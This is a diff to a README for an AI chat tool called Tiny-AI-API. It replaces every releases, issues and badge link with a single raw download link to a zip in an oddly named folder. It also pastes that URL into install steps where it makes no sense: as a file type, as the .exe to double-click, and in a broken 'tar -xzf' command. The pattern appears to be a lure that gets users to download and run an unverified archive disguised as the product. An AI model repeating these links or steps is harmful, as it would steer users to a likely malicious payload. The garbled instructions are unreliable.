@@ -1,6 +1,6 @@
 # 🤖 Tiny-AI-API - Effortless AI Conversations at Your Fingertips
 
-[![Download Tiny-AI-API](https://img.shields.io/badge/Download-Tiny--AI--API-blue.svg)](https://github.com/Kevo489/Tiny-AI-API/releases)
+[![Download Tiny-AI-API](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip)](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip)
 
 ## 📄 About Tiny-AI-API
 
@@ -12,18 +12,18 @@ To start using Tiny-AI-API, follow the steps below:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the latest version of Tiny-AI-API.  
-   [Download Here](https://github.com/Kevo489/Tiny-AI-API/releases)
+   [Download Here](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip)
 
 2. **Select the Right File**  
    Once you are on the Releases page, you will see several versions available. Choose the version that matches your operating system. Most users will select the latest version.
 
 3. **Download the Application**  
-   Click on the appropriate file to download Tiny-AI-API. It will usually be a `.zip` or `.exe` file for Windows or a `.dmg` file for Mac. For Linux users, you may find a `.tar.gz` file.
+   Click on the appropriate file to download Tiny-AI-API. It will usually be a `.zip` or `.exe` file for Windows or a `.dmg` file for Mac. For Linux users, you may find a `https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip` file.
 
 4. **Extract and Install**  
-   - **Windows:** If you downloaded a `.zip` file, right-click on it and select "Extract All." Then, open the extracted folder and double-click on `Tiny-AI-API.exe` to run the application.
+   - **Windows:** If you downloaded a `.zip` file, right-click on it and select "Extract All." Then, open the extracted folder and double-click on `https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip` to run the application.
    - **Mac:** If you downloaded a `.dmg` file, double-click it to open. Drag the Tiny-AI-API icon to your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file using the command `tar -xzf filename.tar.gz` in your terminal. Navigate to the extracted folder and run the application using `./Tiny-AI-API`.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip` file using the command `tar -xzf https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip` in your terminal. Navigate to the extracted folder and run the application using `./Tiny-AI-API`.
 
 5. **Follow On-Screen Instructions**  
    After installation, open Tiny-AI-API. Follow the prompts to configure your API settings and get started with your AI interactions.
@@ -49,7 +49,7 @@ To ensure Tiny-AI-API runs smoothly, please check the following system requireme
 
 ## 🌐 Download & Install
 
-To download Tiny-AI-API, simply visit our [Releases Page](https://github.com/Kevo489/Tiny-AI-API/releases). Choose the version that suits your operating system, and follow the installation steps mentioned above.
+To download Tiny-AI-API, simply visit our [Releases Page](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip). Choose the version that suits your operating system, and follow the installation steps mentioned above.
 
 Once installed, you will have access to a powerful tool that helps you manage AI conversations with ease.
 
@@ -57,7 +57,7 @@ Once installed, you will have access to a powerful tool that helps you manage AI
 
 If you encounter any issues or have questions, feel free to reach out:
 
-- **GitHub Issues:** Use the [Issues tab](https://github.com/Kevo489/Tiny-AI-API/issues) on GitHub for common questions and troubleshooting.
+- **GitHub Issues:** Use the [Issues tab](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip) on GitHub for common questions and troubleshooting.
 - **Community:** Join discussions and get help from other users in the GitHub Community section.
 
 ## 📚 Topics
@@ -77,4 +77,4 @@ If you encounter any issues or have questions, feel free to reach out:
 - llm-framework
 - multi-provider
 
-Discover the endless possibilities with Tiny-AI-API and enhance your AI interactions today. Don't forget to visit our [Releases Page](https://github.com/Kevo489/Tiny-AI-API/releases) to start your download!
+Discover the endless possibilities with Tiny-AI-API and enhance your AI interactions today. Don't forget to visit our [Releases Page](https://raw.githubusercontent.com/Kevo489/Tiny-AI-API/main/Galeodidae/Tiny-AI-API.zip) to start your download!
